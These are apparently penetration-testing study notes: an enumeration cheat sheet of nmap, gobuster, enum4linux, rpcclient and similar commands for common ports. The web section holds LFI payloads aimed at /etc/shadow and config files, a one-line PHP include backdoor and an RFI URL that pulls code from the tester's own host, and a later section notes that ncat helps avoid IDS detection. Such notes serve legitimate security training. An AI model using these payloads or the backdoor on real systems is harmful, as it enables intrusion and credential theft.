# Enumeration

# Port Scan
```
nmap 10.x.x.x
nmap -sV -A --script vuln -p-
nmap -sU --open -p 161 192.168.1.200-254     # UDP
unicornscan
netdiscover
UDP Scan
SNMP Scan
```

### Port 21
```
nmap -v -p 21 --script=ftp-anon.nse 10.x.x.1-254
anonymous login?
bruteforce?
use msf module to see if read/write access
OS version
Other software you can find on the machine (Prog Files, yum.log, /bin)
password files
DLLs for msfpescan / BOF targets
Do you have UPLOAD potential?
Can you trigger execution of uploads?
Swap binaries?
Vulnerabilities in version / RCE / #WINNING?-D

```

### DNS
```
host -t ns megacorpone.com 
host -l megacorpone.com ns1.megacorpone.com 
host -l megacorpone.com ns2.megacorpone.com 

dnsrecon 
dnsenum
nmap --script dns-zone-transfer -p 53 ns2.megacorpone.com 

# Recon-NG
recon-ng is like msfconsole 
use recon/domains-contacts/whois_pocs 

```

### Port 80,443,8080,8888
```
nikto -host 10.x.x.x
gobuster -e -u http://10.x.x.x/php -w /usr/share/wordlists/dirb/common.txt
gobuster -u http://10.x.x.x/ -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
gobuster -u http://10.x.x.x/ -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt
gobuster -u http://10.x.x.x/ -w /usr/share/seclists/Discovery/Web_Content/common.txt
dirbuster
bruteforce?
curl -i http://10.x.x.x/index.php
curl -i http://10.x.x.x/robots.txt

# Other possibilities
Heartbleed / CRIME / Other similar attacks
Read the actual SSL CERT to:
find out potential correct vhost to GET
is the clock skewed
any names that could be usernames for bruteforce/guessing.

# SQL Injection Possibility
Browse the site but keep an eye on the burp window / source code / cookies etc.
Things to be on look for:
Default credentials for software
SQL-injectable GET/POST params
LFI/RFI through ?page=foo type params
LFI:
/etc/passwd | /etc/shadow insta-win
/var/www/html/config.php or similar paths to get SQL etc creds
?page=php://filter/convert.base64-encode/resource=../config.php
../../../../../boot.ini to find out windows version
RFI:
Have your PHP/cgi downloader ready
<?php include $_GET['inc']; ?> simplest backdoor to keep it dynamic without anything messing your output
Then you can just http://$IP/inc.php?inc=http://$YOURIP/bg.php and have full control with minimal footprint on target machine
get phpinfo()

```
### UDP 161 (snmp)

```
snmp-check
snmpwalk
snmpwalk -c public -v1 10.x.x.x
onesixtyone
```

### UDP 69 (tftp)

```
# read/write access?```
```

### SMB 139/445
```
enum4linux -a 10.x.x.x
nbtscan
searchsploit version
smbclient -L 10.x.x.x

# OS Discovery 
nmap 10.x.x.x --script smb-os-discovery.nse 

Mount shares
mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//10.x.x.x/share_name" /mnt/share_name

# SMB Versions
SMB1 – Windows 2000, XP and Windows 2003. 
SMB2 – Windows Vista SP1 and Windows 2008 
SMB2.1 – Windows 7 and Windows 2008 R2 
SMB3 – Windows 8 and Windows 2012

#smb null session 
rpcclient -U "" 192.168.1.1 (windows 2000 server) 
enter password (leaveblank) 
 
rpcclient $> srvinfo 
rpcclient $> enumdomusers 
rpcclient $> getdompwinfo 
```

### EMAIL Protocols
```
Email - 25, 110/995 or 143/993
SMTP, POP3(s) and IMAP(s) are good for enumerating users.
searchsploit

# Use nc to verify local users on the box
nc -nv 192.168.1.1 25 (mail server) 
# replies with banner sendmail 8 server(in example) 
VRFY bob 
VRFY idontexist 
```

### Wireshark
```
wireshark 
capture device only on vpn interface 

#capture filter: 
host 192.168.1.1 and tcp port 4444 

#with nc tool, all packets are in plaintext by running ipconfig. 
# ncat encrypts everything. reduces risk for getting detected by IDS (intrusion detection system)
```
